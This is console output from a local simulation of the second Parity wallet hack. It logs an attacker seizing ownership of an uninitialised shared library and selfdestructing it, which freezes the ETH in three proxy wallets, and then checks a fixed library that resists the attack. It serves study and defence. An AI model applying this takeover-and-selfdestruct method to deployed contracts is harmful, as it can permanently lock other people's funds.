============================================================
  PARITY HACK #2 — Library Self-Destruct → Frozen Funds
============================================================

[1] Deploying SharedWalletLibraryVulnerable...
  Library: 0x5FbDB2315678afecb367f032d93F642f64180aa3
  Library code size (before): 801 bytes
  PASS: Library has code before attack

[2] Deploying 3 SharedWallet proxies (all pointing to same library)...
  Wallet1: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
  Wallet2: 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
  Wallet3: 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9

[3] Funding each wallet with 5 ETH...

[4] Initializing each wallet with its proper owner (via delegatecall)...
  Wallet1 owner: 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  Wallet2 owner: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
  Wallet3 owner: 0x90F79bf6EB2c4f870365E785982E1f101E93b906

  Balances before attack:
  Wallet1: 5.0000 ETH
  Wallet2: 5.0000 ETH
  Wallet3: 5.0000 ETH

[5] ATTACK step 1: attacker calls initWallet() DIRECTLY on the library...
  (Not via proxy — this writes to the library's own storage, not a proxy's)
  Library's own owner: 0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65
  PASS: Attacker now owns the library contract directly

[6] ATTACK step 2: attacker calls killLibrary() to selfdestruct the library...
  Library code size before kill: 801 bytes
  Library code size after kill:  0 bytes
  PASS: Library code = 0x (selfdestruct confirmed)

[7] Checking wallet balances after library destruction...
  Wallet1: 5.0000 ETH  ← FROZEN (ETH not stolen, only inaccessible)
  PASS: Wallet1: 5 ETH still present (frozen, not stolen)
  Wallet2: 5.0000 ETH  ← FROZEN (ETH not stolen, only inaccessible)
  PASS: Wallet2: 5 ETH still present (frozen, not stolen)
  Wallet3: 5.0000 ETH  ← FROZEN (ETH not stolen, only inaccessible)
  PASS: Wallet3: 5 ETH still present (frozen, not stolen)

[8] Owners try to execute() — should fail (library code is gone)...
  Execute reverted: true
  PASS: Execute fails after library self-destruct (Library code not found)

============================================================
  IMPORTANT: THIS IS NOT A THEFT
============================================================
  The attacker did NOT steal wallet ETH.
  The shared library code was destroyed via selfdestruct.
  All proxies that relied on this library can no longer delegatecall.
  Wallet funds are FROZEN — permanently inaccessible.

============================================================
  SHAREDWALLETLIBRARYFIXED — Protection Verification
============================================================
  Fixed library deployed: 0xa513E6E4b8f2a923D98304ec87F64353C4D5C853
  Fixed wallet owner (set via delegatecall): 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
  PASS: Fixed wallet: legitimate initialization via delegatecall works
  Direct library initWallet reverted: true
  PASS: Fixed library: direct initialization rejected

  No killLibrary function — checking library is still alive...
  Fixed library code size: 901 bytes
  PASS: Fixed library: still has code (no selfdestruct path)
  Fixed wallet balance after legitimate withdraw: 2.0000 ETH
  PASS: Fixed wallet: owner can execute normally

============================================================
  PARITY #2 SIMULATION COMPLETE
============================================================
